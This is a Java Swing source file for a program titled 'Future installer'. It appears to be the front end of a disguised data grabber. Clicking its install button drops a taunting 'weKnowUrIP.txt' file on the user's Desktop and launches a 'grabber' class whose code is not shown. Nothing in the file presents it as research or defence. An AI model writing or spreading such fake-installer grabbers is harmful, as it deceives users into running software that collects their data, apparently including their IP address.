package me.doundeway.future;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

import javax.imageio.ImageIO;
import javax.swing.*;


public class gui extends JFrame{
	
	String home = System.getProperty("user.home");
	String FinalHome = home + "\\Desktop\\";
	
	ImageIcon img =  new ImageIcon(getClass().getClassLoader().getResource("logo.png"));

	ImageIcon img2 =  new ImageIcon(getClass().getClassLoader().getResource("logo2.png"));
	ImageIcon img3 =  new ImageIcon(getClass().getClassLoader().getResource("download.png"));
	public final JPanel p = new JPanel();
	
	

	public final JLabel l = new JLabel("", img, JLabel.CENTER);
	public final JButton b = new JButton((Icon) img2);
		gui(){	
			//gui settings
			this.setTitle("Future installer");
			Color c = new Color(128, 0, 0);
			this.setDefaultCloseOperation(EXIT_ON_CLOSE);
			this.add(p);
			
			this.setSize(500, 430);
			this.setResizable(false);
			l.setBounds(getBounds());
			this.add(l);
			this.setVisible(true); 
			this.setLayout(null);
			b.setBounds(176, 200, 100, 60);
			b.setSize(150, 40);
			b.setBackground(c);
			b.setFont(new Font("Calibri", Font.PLAIN,25));
			b.setForeground(new Color(0, 0, 0));
			b.setBorder(BorderFactory.createEtchedBorder());
			b.setFocusable(false);
			this.setIconImage(img3.getImage());
			this.add(b);
			b.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					b.setEnabled(false);
						File myObj = new File(FinalHome + "weKnowUrIP.txt");
						try {
							myObj.createNewFile();
						} catch (IOException e2) {
							
							e2.printStackTrace();				
					}			
					try {
						new grabber();
					} catch (IOException e1) {
						e1.printStackTrace();
					}
					
				}
			});
			
		}
      
}
